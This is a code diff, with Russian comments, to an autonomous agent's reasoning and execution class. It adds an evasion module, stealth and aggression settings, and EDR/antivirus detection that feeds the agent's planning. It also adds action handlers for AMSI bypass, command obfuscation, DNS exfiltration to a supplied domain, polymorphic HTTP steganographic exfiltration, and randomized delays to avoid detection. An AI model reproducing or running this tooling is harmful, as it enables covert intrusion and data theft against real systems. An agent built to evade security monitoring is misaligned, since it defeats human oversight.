@@ -43,6 +43,7 @@ if not logger.handlers:
 THINKING_SYMBOLS = ["💭", "🧠", "🤔", "🔄", "⚙️"]
 
 from agent_modules.environment_manager import EnvironmentManager
+from agent_modules.advanced_evasion import AdvancedEvasion
 
 class AgentThinker:
     """
@@ -91,7 +92,13 @@ class AgentThinker:
         # Загружаем системный промпт
         self.system_prompt = self._load_system_prompt()
         
+        # Инициализируем менеджеры
         self.environment_manager = environment_manager or EnvironmentManager()
+        self.advanced_evasion = AdvancedEvasion(log_actions=True)
+        
+        # Устанавливаем уровень скрытности и агрессивности
+        self.stealth_level = 0.5  # От 0.0 до 1.0
+        self.aggression_level = 0.3  # От 0.0 до 1.0
         
         logger.info("AgentThinker инициализирован")
     
@@ -282,7 +289,9 @@ class AgentThinker:
             "goals": self.state.get_goals(),
             "recent_commands": self.state.get_commands(10),
             "recent_errors": self.state.get_errors(5),
-            "system_info": {}
+            "system_info": {},
+            "stealth_level": self.stealth_level,
+            "aggression_level": self.aggression_level
         }
         
         # Добавляем системную информацию через EnvironmentManager
@@ -292,10 +301,20 @@ class AgentThinker:
                 "current_dir": os.getcwd(),
                 "python_version": sys.version.split()[0]
             })
-            # Можно добавить процессы, сеть, EDR/AV если нужно для reasoning
+            # Добавляем информацию об обнаруженной защите
             context["system_info"]["edr_av"] = self.environment_manager.detect_edr_av()
+            
+            # Получаем рекомендации по адаптации поведения
+            adaptation = self.environment_manager.adapt_behavior(self.stealth_level)
+            context["adaptation"] = adaptation
         except Exception as e:
             logger.error(f"Ошибка при сборе системной информации через EnvironmentManager: {str(e)}")
+        
+        # Добавляем информацию о состоянии модуля обхода защиты
+        try:
+            context["evasion_status"] = self.advanced_evasion.get_status()
+        except Exception as e:
+            logger.error(f"Ошибка при получении статуса AdvancedEvasion: {str(e)}")
         
         # Добавляем последние наблюдения из памяти
         try:
@@ -339,6 +358,8 @@ class AgentThinker:
         context_text.append(f"Дата и время: {context['timestamp']}")
         context_text.append(f"ID агента: {context['agent_id']}")
         context_text.append(f"Режим работы: {context['operational_mode']}")
+        context_text.append(f"Уровень скрытности: {context.get('stealth_level', 0.5)}")
+        context_text.append(f"Уровень агрессивности: {context.get('aggression_level', 0.3)}")
         context_text.append("")
         
         # Добавляем системную информацию
@@ -347,6 +368,27 @@ class AgentThinker:
         for key, value in sys_info.items():
             context_text.append(f"- {key}: {value}")
         context_text.append("")
+        
+        # Добавляем информацию о защите и рекомендациях
+        if "adaptation" in context:
+            context_text.append("## Рекомендации по адаптации")
+            adapt_info = context["adaptation"]
+            context_text.append(f"- Уровень риска: {adapt_info.get('risk_level', 0)}")
+            context_text.append(f"- Обнаружены EDR: {', '.join(adapt_info.get('edr_detected', ['нет']))}")
+            context_text.append(f"- Обнаружены AV: {', '.join(adapt_info.get('av_detected', ['нет']))}")
+            context_text.append(f"- Рекомендуемый режим: {adapt_info.get('execution_mode', 'normal')}")
+            context_text.append(f"- Использовать обфускацию: {adapt_info.get('use_obfuscation', False)}")
+            context_text.append("")
+        
+        # Добавляем информацию о состоянии модуля обхода защиты
+        if "evasion_status" in context:
+            context_text.append("## Статус модуля обхода защиты")
+            evasion_status = context["evasion_status"]
+            context_text.append(f"- ОС: {evasion_status.get('os', 'неизвестно')}")
+            context_text.append(f"- Админ-права: {evasion_status.get('is_admin', False)}")
+            context_text.append(f"- Доступность ctypes: {evasion_status.get('ctypes_available', False)}")
+            context_text.append(f"- Доступность requests: {evasion_status.get('requests_available', False)}")
+            context_text.append("")
         
         # Добавляем цели
         context_text.append("## Текущие цели")
@@ -917,40 +959,121 @@ class AgentThinker:
         Выполняет запланированные действия.
         
         Args:
-            actions: Список команд для выполнения
+            actions: Список действий для выполнения
         """
-        # Проверяем, что есть функция обратного вызова для выполнения команд
-        if not self.command_callback or not callable(self.command_callback):
-            logger.warning("Функция для выполнения команд не задана")
+        if not actions:
             return
         
-        # Выполняем команды последовательно
-        for cmd in actions:
+        if not self.command_callback:
+            logger.error("Нет callback-функции для выполнения команд")
+            return
+        
+        logger.info(f"Выполнение запланированных действий: {len(actions)}")
+        
+        # Получаем рекомендации по адаптации
+        adaptation = self.environment_manager.adapt_behavior(self.stealth_level)
+        use_obfuscation = adaptation.get('use_obfuscation', False)
+        use_sleep = adaptation.get('random_sleep', False)
+        sleep_time = adaptation.get('sleep_between_actions', 1000) / 1000.0
+        
+        # Выполняем каждое действие
+        for i, action in enumerate(actions):
             try:
-                logger.info(f"Выполнение автономной команды: {cmd}")
+                # Проверяем, содержит ли действие специальные команды обхода защиты
+                if action.startswith("!obfuscate "):
+                    cmd = action.replace("!obfuscate ", "")
+                    logger.info(f"Обфускация команды: {cmd}")
+                    obfuscated = self.advanced_evasion.obfuscate_string(cmd)
+                    deobfuscated = self.advanced_evasion.deobfuscate_string(obfuscated)
+                    logger.debug(f"Обфусцированная команда: {obfuscated}")
+                    logger.debug(f"Деобфусцированная команда: {deobfuscated}")
+                    
+                    self.memory.add_to_short_term(
+                        category="action", 
+                        content=f"Выполнена обфусцированная команда: {cmd}"
+                    )
+                    
+                    # Выполняем деобфусцированную команду
+                    result = self.command_callback(deobfuscated)
+                    
+                elif action.startswith("!amsi_bypass"):
+                    logger.info("Выполнение обхода AMSI...")
+                    result = self.advanced_evasion.amsi_bypass()
+                    self.memory.add_to_short_term(
+                        category="action", 
+                        content=f"Выполнен обход AMSI: {result}"
+                    )
                 
-                # Регистрируем команду в состоянии
-                cmd_id = self.state.log_command(cmd, "autonomous")
+                elif action.startswith("!dns_exfil "):
+                    parts = action.split(" ", 2)
+                    if len(parts) == 3:
+                        domain = parts[1]
+                        data = parts[2]
+                        logger.info(f"Выполнение DNS exfiltration к {domain}...")
+                        result = self.advanced_evasion.dns_exfiltrate(data, domain)
+                        self.memory.add_to_short_term(
+                            category="action", 
+                            content=f"Выполнен DNS exfiltration: {result}"
+                        )
+                    else:
+                        result = "Неверный формат команды !dns_exfil"
                 
-                # Выполняем команду через callback
-                result = self.command_callback(cmd)
+                elif action.startswith("!stealth_http "):
+                    parts = action.split(" ", 2)
+                    if len(parts) == 3:
+                        url = parts[1]
+                        data = parts[2]
+                        logger.info(f"Выполнение полиморфной стеганографии к {url}...")
+                        result = self.advanced_evasion.polymorphic_exfil(data, url)
+                        self.memory.add_to_short_term(
+                            category="action", 
+                            content=f"Выполнена полиморфная стеганография: {result}"
+                        )
+                    else:
+                        result = "Неверный формат команды !stealth_http"
+                        
+                # Если это обычная команда, обфусцируем её при необходимости
+                else:
+                    if use_obfuscation and not action.startswith("!"):
+                        # Обфусцируем обычные команды, но не специальные команды с !
+                        logger.info(f"Автоматическая обфускация команды для повышения скрытности: {action}")
+                        obfuscated = self.advanced_evasion.obfuscate_string(action)
+                        action_to_execute = self.advanced_evasion.deobfuscate_string(obfuscated)
+                    else:
+                        action_to_execute = action
+                    
+                    logger.info(f"Выполнение команды: {action_to_execute}")
+                    result = self.command_callback(action_to_execute)
                 
-                # Обновляем статус команды
-                self.state.update_command(cmd_id, "completed", result)
+                # Сохраняем результат в память
+                if isinstance(result, dict):
+                    output = result.get('output', str(result))
+                    exit_code = result.get('exit_code', 0)
+                    self.memory.add_to_short_term(
+                        category="result", 
+                        content=f"Result of '{action}': {output}", 
+                        metadata={"exit_code": exit_code}
+                    )
+                else:
+                    self.memory.add_to_short_term(
+                        category="result", 
+                        content=f"Result of '{action}': {result}"
+                    )
                 
-                # Если команда выполнилась с ошибкой, прекращаем выполнение
-                if result.get('error'):
-                    logger.error(f"Ошибка при выполнении команды: {result.get('error')}")
-                    self.state.log_error(f"Ошибка при выполнении автономной команды: {cmd}")
-                    break
-                
-                # Делаем паузу между командами
-                time.sleep(1)
+                # Добавляем случайную задержку между командами, если нужно
+                if use_sleep and i < len(actions) - 1:
+                    delay = random.uniform(0.8 * sleep_time, 1.2 * sleep_time)
+                    logger.debug(f"Добавлена задержка между командами: {delay:.2f} с")
+                    time.sleep(delay)
                 
             except Exception as e:
-                logger.error(f"Ошибка при выполнении команды {cmd}: {str(e)}")
-                self.state.log_error(f"Исключение при выполнении автономной команды: {str(e)}")
-                break
+                logger.error(f"Ошибка при выполнении действия '{action}': {str(e)}")
+                self.memory.add_to_short_term(
+                    category="error", 
+                    content=f"Error executing '{action}': {str(e)}"
+                )
+        
+        logger.info(f"Выполнение запланированных действий завершено")
 
 
 # Пример использования
